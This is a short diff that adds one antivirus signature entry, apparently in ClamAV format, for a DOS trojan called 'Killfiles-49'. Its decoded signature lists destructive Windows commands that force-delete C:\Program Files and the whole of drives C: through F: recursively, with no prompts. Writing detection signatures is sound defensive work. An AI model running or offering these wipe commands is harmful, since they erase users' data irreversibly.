@@ -1,0 +1,9 @@
+VIRUS NAME: Dos.Trojan.Killfiles-49
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+DEL /Q /S /F C:\Program Files
+DEL /Q /S /F C:\
+DEL /Q /S /F D:\
+DEL /Q /S /F E:\
+DEL /Q /S /F F:\
